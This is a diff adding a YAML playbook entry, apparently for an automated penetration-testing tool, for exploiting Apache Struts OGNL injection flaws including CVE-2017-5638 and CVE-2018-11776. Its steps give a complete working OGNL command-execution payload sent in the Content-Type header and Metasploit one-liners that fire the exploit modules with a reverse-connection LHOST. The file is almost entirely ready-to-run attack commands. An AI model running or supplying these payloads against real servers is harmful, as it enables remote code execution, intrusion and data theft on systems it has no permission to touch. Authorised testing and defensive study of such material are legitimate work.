@@ -1,0 +1,37 @@
+id: tech_struts
+title: "Apache Struts — OGNL injection (CVE-2017-5638, CVE-2018-11776, CVE-2023-50164)"
+phase: exploit
+mitre: ["T1190"]
+trigger:
+  services: ["http", "https"]
+  ports:    [80, 443, 8080, 8443]
+  technologies: ["struts", "apache struts", ".action", "/struts2-showcase"]
+  cves:     ["CVE-2017-5638", "CVE-2018-11776", "CVE-2017-9805", "CVE-2023-50164"]
+keywords: ["struts", "struts2", "ognl", "content-type rce", "namespace traversal"]
+preconditions:
+  - "Struts2 footprint visible (.action / .do extensions, /struts2- examples)"
+steps:
+  - tool: curl
+    cmd:  "curl -s {base_url}/ -I; curl -s {base_url}/login.action -I"
+    why:  "Probe for .action handlers + framework banner"
+  - tool: nuclei
+    cmd:  "nuclei -tags struts -u {base_url}"
+    why:  "All Struts CVE checks in one sweep"
+  - tool: curl
+    cmd:  "curl -sk {base_url}/ -H \"Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\""
+    why:  "CVE-2017-5638 (Equifax breach) — OGNL via Content-Type header (Struts 2.3.x ≤ 2.3.31, 2.5.x ≤ 2.5.10)"
+  - tool: msfconsole
+    cmd:  "msfconsole -qx 'use exploit/multi/http/struts2_content_type_ognl; set RHOSTS {target}; set RPORT {port}; set TARGETURI /; set LHOST {LHOST}; run'"
+    why:  "Automated CVE-2017-5638 exploit"
+  - tool: msfconsole
+    cmd:  "msfconsole -qx 'use exploit/multi/http/struts2_namespace_ognl; set RHOSTS {target}; set RPORT {port}; set TARGETURI /; set LHOST {LHOST}; run'"
+    why:  "CVE-2018-11776 — namespace traversal OGNL (Struts 2.3.0-2.3.34, 2.5.0-2.5.16)"
+  - tool: msfconsole
+    cmd:  "msfconsole -qx 'use exploit/multi/http/struts2_rest_xstream; set RHOSTS {target}; set RPORT {port}; set TARGETURI /; set LHOST {LHOST}; run'"
+    why:  "CVE-2017-9805 — XStream deserialization in REST plugin"
+expected_outcome: "Java RCE as web user (often jboss/tomcat) — Equifax-class severity"
+fallbacks:
+  - "CVE-2023-50164 — file upload path traversal (Struts 2.5.0-2.5.32, 6.0.0-6.3.0)"
+  - "Showcase app left enabled (/struts2-showcase) → tons of demo endpoints with OGNL primitives"
+references:
+  - "https://cwiki.apache.org/confluence/display/WW/Security+Bulletins"
